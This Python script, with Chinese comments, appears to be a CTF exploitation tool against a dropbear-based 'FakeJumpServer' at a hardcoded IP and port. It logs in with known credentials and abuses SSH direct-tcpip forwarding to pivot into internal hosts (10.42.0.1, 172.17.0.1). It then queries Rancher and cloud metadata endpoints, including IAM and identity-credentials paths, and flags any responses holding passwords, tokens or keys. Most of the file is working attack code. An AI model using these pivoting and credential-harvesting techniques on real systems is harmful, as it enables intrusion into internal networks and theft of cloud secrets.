#!/usr/bin/env python3
"""
深入分析：用户名导致连接转发的行为
当使用特殊用户名时，dropbear可能将连接转发到其他主机
"""

import socket
import time
import struct

HOST = "61.147.171.105"
PORT = 55300

def raw_ssh_test(username, password="123456"):
    """使用原始socket测试SSH行为"""
    print(f"\n{'='*60}")
    print(f"[*] 测试用户名: '{username}'")
    print("=" * 60)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((HOST, PORT))
        
        # 读取服务器banner
        data = b""
        while b"\n" not in data:
            chunk = sock.recv(1024)
            if not chunk:
                break
            data += chunk
        
        server_banner = data.decode('utf-8', errors='ignore').strip()
        print(f"[1] 服务器Banner: {server_banner}")
        
        # 发送客户端版本
        client_banner = b"SSH-2.0-Test_Client\r\n"
        sock.send(client_banner)
        print(f"[2] 发送客户端Banner: {client_banner.strip().decode()}")
        
        # 读取KEX_INIT
        kex_data = sock.recv(4096)
        print(f"[3] 收到KEX_INIT ({len(kex_data)} bytes)")
        
        # 检查是否是期望的dropbear还是被转发了
        if b"dropbear" in kex_data or b"dropbear" in server_banner.encode():
            print("    -> 连接到dropbear")
        elif b"OpenSSH" in server_banner.encode():
            print("    -> 连接到OpenSSH (可能被转发!)")
        
        # 尝试继续交互看看发生什么
        # 发送一些数据看服务器反应
        time.sleep(0.5)
        try:
            more_data = sock.recv(4096, socket.MSG_DONTWAIT)
            print(f"[4] 额外数据: {len(more_data)} bytes")
        except:
            print("[4] 无额外数据")
        
    except socket.timeout:
        print("[!] 连接超时")
    except ConnectionResetError:
        print("[!] 连接被重置")
    except Exception as e:
        print(f"[!] 错误: {e}")
    finally:
        sock.close()

def analyze_protocol_with_username():
    """分析在协议层面用户名的影响"""
    print("\n" + "=" * 70)
    print("[*] 关键发现分析")
    print("=" * 70)
    print("""
根据测试结果，当用户名包含以下模式时，连接会被关闭：
1. 包含 @ 符号（任何形式）
2. 包含 % 符号
3. 包含 : / \\ + ! # $ 等特殊字符
4. 某些关键字：jump, proxy, forward, tunnel, admin, flag, root, real, host, target, destination

这很可能意味着：
- dropbear在接收到用户名后会解析它
- 如果用户名包含特殊格式（如 user@host），dropbear会尝试转发连接
- 转发可能失败导致连接关闭（目标不可达或认证失败）

FakeJumpServer的工作原理可能是：
1. 接收SSH连接
2. 解析用户名中的跳转目标（如 ctf@172.17.0.1）
3. 将连接转发到目标主机
4. 使用相同的凭据进行认证

关键问题：如何让转发成功？
可能需要找到一个：
- 目标主机支持我们已知的凭据
- 或者利用某种凭据传递机制
""")

def test_with_ssh_command():
    """使用ssh命令行测试（如果可用）"""
    import subprocess
    import os
    
    print("\n" + "=" * 70)
    print("[*] 尝试使用SSH命令行测试")
    print("=" * 70)
    
    # 检查是否有ssh命令
    ssh_path = None
    for path in ["C:\\Windows\\System32\\OpenSSH\\ssh.exe", 
                 "C:\\Program Files\\Git\\usr\\bin\\ssh.exe",
                 "ssh"]:
        try:
            result = subprocess.run([path, "-V"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0 or "OpenSSH" in result.stderr:
                ssh_path = path
                print(f"找到SSH: {ssh_path}")
                break
        except:
            continue
    
    if not ssh_path:
        print("未找到SSH命令")
        return
    
    # 测试关键用户名格式
    test_cases = [
        "ctf@172.17.0.1",  # 用户名中包含目标IP
        "ctf",  # 正常用户名
    ]
    
    for username in test_cases[:1]:  # 只测试第一个
        print(f"\n测试: {username}")
        try:
            # 使用-v显示详细信息
            cmd = [ssh_path, "-v", "-o", "StrictHostKeyChecking=no", 
                   "-o", "UserKnownHostsFile=/dev/null",
                   "-o", "BatchMode=yes",
                   "-p", str(PORT), 
                   f"{username}@{HOST}"]
            print(f"命令: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            print(f"stdout: {result.stdout[:500]}")
            print(f"stderr: {result.stderr[:500]}")
        except subprocess.TimeoutExpired:
            print("超时")
        except Exception as e:
            print(f"错误: {e}")

def test_10_42_0_1_directly():
    """单独测试10.42.0.1"""
    print("\n" + "=" * 70)
    print("[*] 测试通过direct-tcpip连接10.42.0.1")
    print("=" * 70)
    
    import paramiko
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, "ctf", "123456")
    transport = client.get_transport()
    
    print("\n[1] 连接10.42.0.1:22...")
    try:
        chan = transport.open_channel(
            "direct-tcpip",
            ("10.42.0.1", 22),
            ("127.0.0.1", 0)
        )
        
        banner = chan.recv(1024).decode('utf-8', errors='ignore')
        print(f"  Banner: {banner[:60]}")
        chan.close()
        
        # 获取host key
        print("\n[2] 获取10.42.0.1的Host Key...")
        chan2 = transport.open_channel(
            "direct-tcpip",
            ("10.42.0.1", 22),
            ("127.0.0.1", 0)
        )
        
        inner_transport = paramiko.Transport(chan2)
        inner_transport.start_client()
        key = inner_transport.get_remote_server_key()
        fingerprint = key.get_fingerprint().hex()
        print(f"  10.42.0.1 Host Key: {fingerprint}")
        inner_transport.close()
        
        # 比较172.17.0.1
        print("\n[3] 获取172.17.0.1的Host Key...")
        chan3 = transport.open_channel(
            "direct-tcpip",
            ("172.17.0.1", 22),
            ("127.0.0.1", 0)
        )
        
        inner_transport2 = paramiko.Transport(chan3)
        inner_transport2.start_client()
        key2 = inner_transport2.get_remote_server_key()
        fingerprint2 = key2.get_fingerprint().hex()
        print(f"  172.17.0.1 Host Key: {fingerprint2}")
        inner_transport2.close()
        
        if fingerprint == fingerprint2:
            print("\n  [!] 两个IP的Host Key相同！可能是同一台主机！")
        else:
            print("\n  两个IP的Host Key不同，是不同的主机")
        
    except Exception as e:
        print(f"错误: {e}")
    
    client.close()

def search_for_valid_credentials():
    """搜索可能的有效凭据"""
    print("\n" + "=" * 70)
    print("[*] 通过Rancher metadata搜索更多凭据")
    print("=" * 70)
    
    import paramiko
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, "ctf", "123456")
    transport = client.get_transport()
    
    # 深入搜索metadata
    endpoints = [
        "/latest/self/service/metadata",
        "/latest/self/stack",
        "/latest/self/container/service_name",
        "/latest/self/container/service_index",
        "/latest/self/container/labels",
        "/latest/hosts",
        "/latest/hosts/1",
        "/2015-07-25/user-data",
        "/2015-12-07/user-data",
        "/latest/meta-data/",
        "/latest/meta-data/public-keys/",
        "/latest/meta-data/iam/",
        "/latest/meta-data/identity-credentials/",
    ]
    
    for endpoint in endpoints:
        try:
            chan = transport.open_channel(
                "direct-tcpip",
                ("172.17.0.2", 80),
                ("127.0.0.1", 0)
            )
            chan.settimeout(3)
            
            request = f"GET {endpoint} HTTP/1.0\r\nHost: rancher-metadata\r\nAccept: application/json\r\n\r\n"
            chan.send(request.encode())
            response = chan.recv(8192).decode('utf-8', errors='ignore')
            
            if "\r\n\r\n" in response:
                status_line = response.split("\r\n")[0]
                body = response.split("\r\n\r\n", 1)[1]
                if "200" in status_line and body:
                    print(f"\n{endpoint}:")
                    # 检查是否包含敏感信息
                    if any(kw in body.lower() for kw in ["password", "secret", "key", "token", "credential", "auth"]):
                        print(f"  [!!!] 可能包含敏感信息:")
                        print(f"  {body[:1000]}")
                    else:
                        print(f"  {body[:300]}")
            
            chan.close()
        except Exception as e:
            pass
    
    client.close()

if __name__ == "__main__":
    # raw_ssh_test("ctf")  # 正常
    # raw_ssh_test("ctf@172.17.0.1")  # 会关闭
    
    analyze_protocol_with_username()
    # test_with_ssh_command()
    test_10_42_0_1_directly()
    search_for_valid_credentials()
